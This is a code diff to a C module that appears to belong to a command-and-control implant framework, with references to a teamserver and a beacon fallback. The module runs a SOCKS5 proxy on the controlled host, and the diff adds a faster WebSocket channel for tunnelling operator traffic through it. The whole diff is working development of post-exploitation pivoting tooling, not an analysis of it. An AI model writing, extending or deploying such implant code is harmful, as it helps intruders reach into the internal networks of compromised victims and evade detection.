@@ -98,10 +98,14 @@ void *spec_memcpy(void *dst, const void *src, SIZE_T n)
 
 #define MAX_CONNECTIONS         16
 #define RECV_BUF_SIZE           4096
+#define INBOX_BUF_SIZE          8192   /* enough for 4KiB DATA + header */
 #define MAX_CHUNK_SIZE          3072   /* per-check-in chunk limit      */
 #define DEFAULT_THROTTLE_MS     50     /* inter-chunk throttle (ms)     */
 #define MAX_THROTTLE_MS         60000  /* bound malformed wait args     */
 #define CONN_TIMEOUT_MS         10000  /* connect timeout               */
+
+#define SOCKS_WS_URL_PATH       "\\\\.\\socks\\ws-url"
+#define SOCKS_WS_PATH           "\\\\.\\socks\\ws"
 
 /* Connection state */
 #define CONN_FREE               0
@@ -147,6 +151,7 @@ typedef struct _SOCKS5_STATE {
     SOCKS_CONN  conns[MAX_CONNECTIONS];
     DWORD       active_count;
     BOOL        running;
+    BOOL        ws_active;      /* Interactive WebSocket lane is live */
     DWORD       throttle_ms;    /* Per-chunk throttle in milliseconds   */
 } SOCKS5_STATE;
 
@@ -194,7 +199,8 @@ static SOCKS_CONN *find_conn(SOCKS5_STATE *state, WORD conn_id)
 /*  Helper: send a SOCKS_MSG via bus output                            */
 /* ------------------------------------------------------------------ */
 
-static BOOL send_msg(MODULE_BUS_API *api, WORD conn_id, BYTE msg_type,
+static BOOL send_msg(MODULE_BUS_API *api, SOCKS5_STATE *state,
+                     WORD conn_id, BYTE msg_type,
                      BYTE flags, const BYTE *payload, DWORD payload_len)
 {
     BYTE buf[SOCKS_MSG_HDR_SIZE + MAX_CHUNK_SIZE];
@@ -217,6 +223,12 @@ static BOOL send_msg(MODULE_BUS_API *api, WORD conn_id, BYTE msg_type,
     if (payload && payload_len > 0)
         spec_memcpy(buf + SOCKS_MSG_HDR_SIZE, payload, payload_len);
 
+    if (state && state->ws_active && api->file_write) {
+        if (api->file_write(SOCKS_WS_PATH, buf, total))
+            return TRUE;
+        state->ws_active = FALSE;
+    }
+
     return api->output(buf, total, OUTPUT_BINARY);
 }
 
@@ -234,7 +246,7 @@ static void close_conn(MODULE_BUS_API *api, SOCKS5_STATE *state,
         api->net_close(conn->socket);
 
     if (notify)
-        send_msg(api, conn->conn_id, MSG_CLOSE, 0, NULL, 0);
+        send_msg(api, state, conn->conn_id, MSG_CLOSE, 0, NULL, 0);
 
     if (conn->state != CONN_FREE && state->active_count > 0)
         state->active_count--;
@@ -271,7 +283,7 @@ static void handle_connect_req(MODULE_BUS_API *api, SOCKS5_STATE *state,
         if (!conn) {
             /* No free slots — reject */
             rsp = SOCKS5_REP_GENERAL_FAIL;
-            send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
+            send_msg(api, state, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
             return;
         }
         conn->conn_id = msg->conn_id;
@@ -281,7 +293,7 @@ static void handle_connect_req(MODULE_BUS_API *api, SOCKS5_STATE *state,
 
     if (msg->payload_len < 3) {
         rsp = SOCKS5_REP_GENERAL_FAIL;
-        send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
+        send_msg(api, state, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
         close_conn(api, state, conn, FALSE);
         return;
     }
@@ -294,7 +306,7 @@ static void handle_connect_req(MODULE_BUS_API *api, SOCKS5_STATE *state,
         /* 4 bytes IPv4 */
         if (msg->payload_len < 7) {
             rsp = SOCKS5_REP_GENERAL_FAIL;
-            send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
+            send_msg(api, state, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
             close_conn(api, state, conn, FALSE);
             return;
         }
@@ -322,7 +334,7 @@ static void handle_connect_req(MODULE_BUS_API *api, SOCKS5_STATE *state,
         BYTE dlen = payload[offset++];
         if (offset + dlen + 2 > msg->payload_len || dlen >= sizeof(addr_buf)) {
             rsp = SOCKS5_REP_GENERAL_FAIL;
-            send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
+            send_msg(api, state, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
             close_conn(api, state, conn, FALSE);
             return;
         }
@@ -333,7 +345,7 @@ static void handle_connect_req(MODULE_BUS_API *api, SOCKS5_STATE *state,
     else {
         /* IPv6 or unknown — not supported */
         rsp = SOCKS5_REP_CMD_UNSUP;
-        send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
+        send_msg(api, state, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
         close_conn(api, state, conn, FALSE);
         return;
     }
@@ -345,7 +357,7 @@ static void handle_connect_req(MODULE_BUS_API *api, SOCKS5_STATE *state,
     sock = api->net_connect(addr_buf, port, PROTO_TCP);
     if (!sock || sock == INVALID_HANDLE_VALUE) {
         rsp = SOCKS5_REP_HOST_UNREACH;
-        send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
+        send_msg(api, state, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
         close_conn(api, state, conn, FALSE);
         return;
     }
@@ -357,7 +369,7 @@ static void handle_connect_req(MODULE_BUS_API *api, SOCKS5_STATE *state,
 
     /* Success response */
     rsp = SOCKS5_REP_SUCCESS;
-    send_msg(api, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
+    send_msg(api, state, msg->conn_id, MSG_CONNECT_RSP, 0, &rsp, 1);
 }
 
 /* ------------------------------------------------------------------ */
@@ -370,7 +382,7 @@ static void handle_data(MODULE_BUS_API *api, SOCKS5_STATE *state,
     SOCKS_CONN *conn = find_conn(state, msg->conn_id);
     if (!conn || conn->state != CONN_ESTABLISHED) {
         /* Connection not found or not ready — send CLOSE */
-        send_msg(api, msg->conn_id, MSG_CLOSE, 0, NULL, 0);
+        send_msg(api, state, msg->conn_id, MSG_CLOSE, 0, NULL, 0);
         return;
     }
 
@@ -427,7 +439,7 @@ static void process_message(MODULE_BUS_API *api, SOCKS5_STATE *state,
             break;
         case MSG_KEEPALIVE:
             /* Respond with keepalive */
-            send_msg(api, 0, MSG_KEEPALIVE, 0, NULL, 0);
+            send_msg(api, state, 0, MSG_KEEPALIVE, 0, NULL, 0);
             break;
         default:
             break;
@@ -468,7 +480,7 @@ static void poll_connections(MODULE_BUS_API *api, SOCKS5_STATE *state)
                 if (chunk > MAX_CHUNK_SIZE)
                     chunk = MAX_CHUNK_SIZE;
 
-                send_msg(api, state->conns[i].conn_id, MSG_DATA, 0,
+                send_msg(api, state, state->conns[i].conn_id, MSG_DATA, 0,
                          recv_buf + sent, chunk);
                 sent += chunk;
                 state->conns[i].bytes_recv += chunk;
@@ -481,10 +493,34 @@ static void poll_connections(MODULE_BUS_API *api, SOCKS5_STATE *state)
 /*  Subcommand: start — main SOCKS5 processing loop                    */
 /* ------------------------------------------------------------------ */
 
+static void process_inbound_buffer(MODULE_BUS_API *api, SOCKS5_STATE *state,
+                                   const BYTE *buf, DWORD buf_len)
+{
+    DWORD offset = 0;
+
+    while (offset <= buf_len && buf_len - offset >= SOCKS_MSG_HDR_SIZE) {
+        const SOCKS_MSG *hdr = (const SOCKS_MSG *)(buf + offset);
+        DWORD msg_total;
+
+        if (hdr->payload_len > buf_len - offset - SOCKS_MSG_HDR_SIZE)
+            break;
+        msg_total = SOCKS_MSG_HDR_SIZE + hdr->payload_len;
+
+        if (hdr->msg_type == MSG_CLOSE && hdr->conn_id == 0) {
+            state->running = FALSE;
+            break;
+        }
+
+        process_message(api, state, buf + offset, msg_total);
+        offset += msg_total;
+    }
+}
+
 static DWORD cmd_start(MODULE_BUS_API *api, const MODULE_ARGS *args)
 {
     SOCKS5_STATE state;
     FN_SLEEP fn_sleep;
+    const char *channel_url;
     DWORD throttle;
 
     spec_memset(&state, 0, sizeof(SOCKS5_STATE));
@@ -509,6 +545,19 @@ static DWORD cmd_start(MODULE_BUS_API *api, const MODULE_ARGS *args)
         return MODULE_ERR_INTERNAL;
     }
 
+    channel_url = module_arg_string(args, 2);
+    if (channel_url && channel_url[0] && api->file_write) {
+        if (api->file_write(SOCKS_WS_URL_PATH, (const BYTE *)channel_url,
+                            (DWORD)spec_strlen(channel_url))) {
+            state.ws_active = TRUE;
+            MODULE_OUTPUT_TEXT(api, "socks5: websocket channel connected");
+        } else {
+            MODULE_OUTPUT_ERROR(api, "socks5: websocket unavailable, using beacon fallback");
+        }
+    } else if (channel_url && channel_url[0]) {
+        MODULE_OUTPUT_ERROR(api, "socks5: websocket bus unavailable, using beacon fallback");
+    }
+
     MODULE_OUTPUT_TEXT(api, "socks5: proxy started");
 
     /*
@@ -523,37 +572,21 @@ static DWORD cmd_start(MODULE_BUS_API *api, const MODULE_ARGS *args)
      * terminated by the guardian thread.
      */
     while (state.running) {
-        BYTE inbox[4096];
+        BYTE inbox[INBOX_BUF_SIZE];
         DWORD inbox_len;
-        DWORD offset;
 
         /* Read pending messages from the module inbox.
          * The bus maps "\\.\socks\inbox" to the module's inbound task queue.
          * Returns 0 if no messages pending. */
-        inbox_len = api->file_read("\\\\.\\ socks\\inbox", inbox, sizeof(inbox));
+        inbox_len = api->file_read("\\\\.\\socks\\inbox", inbox, sizeof(inbox));
 
-        if (inbox_len > 0 && inbox_len != (DWORD)-1) {
-            /* Process all messages in the inbox buffer.
-             * Messages are concatenated: [hdr+payload][hdr+payload]... */
-            offset = 0;
-            while (offset <= inbox_len &&
-                   inbox_len - offset >= SOCKS_MSG_HDR_SIZE) {
-                const SOCKS_MSG *hdr = (const SOCKS_MSG *)(inbox + offset);
-                DWORD msg_total;
+        if (inbox_len > 0 && inbox_len != (DWORD)-1)
+            process_inbound_buffer(api, &state, inbox, inbox_len);
 
-                if (hdr->payload_len > inbox_len - offset - SOCKS_MSG_HDR_SIZE)
-                    break;
-                msg_total = SOCKS_MSG_HDR_SIZE + hdr->payload_len;
-
-                /* Check for stop signal (CLOSE with conn_id 0) */
-                if (hdr->msg_type == MSG_CLOSE && hdr->conn_id == 0) {
-                    state.running = FALSE;
-                    break;
-                }
-
-                process_message(api, &state, inbox + offset, msg_total);
-                offset += msg_total;
-            }
+        if (state.ws_active) {
+            inbox_len = api->file_read(SOCKS_WS_PATH, inbox, sizeof(inbox));
+            if (inbox_len > 0 && inbox_len != (DWORD)-1)
+                process_inbound_buffer(api, &state, inbox, inbox_len);
         }
 
         /* Poll established connections for data from targets */
@@ -573,6 +606,8 @@ static DWORD cmd_start(MODULE_BUS_API *api, const MODULE_ARGS *args)
     }
 
     MODULE_OUTPUT_TEXT(api, "socks5: proxy stopped");
+    if (api->file_delete)
+        api->file_delete(SOCKS_WS_PATH);
     return MODULE_SUCCESS;
 }
 
@@ -585,7 +620,7 @@ static DWORD cmd_stop(MODULE_BUS_API *api, const MODULE_ARGS *args)
     /* Send a CLOSE with conn_id=0 as the stop signal.
      * The teamserver relays this to the running socks5 instance
      * via the module inbox. */
-    send_msg(api, 0, MSG_CLOSE, 0, NULL, 0);
+    send_msg(api, NULL, 0, MSG_CLOSE, 0, NULL, 0);
     MODULE_OUTPUT_TEXT(api, "socks5: stop signal sent");
     return MODULE_SUCCESS;
 }
@@ -598,7 +633,7 @@ static DWORD cmd_status(MODULE_BUS_API *api, const MODULE_ARGS *args)
 {
     /* Status is reported by the long-running instance.
      * This subcommand sends a keepalive which triggers a status response. */
-    send_msg(api, 0, MSG_KEEPALIVE, 0, NULL, 0);
+    send_msg(api, NULL, 0, MSG_KEEPALIVE, 0, NULL, 0);
     MODULE_OUTPUT_TEXT(api, "socks5: status request sent");
     return MODULE_SUCCESS;
 }
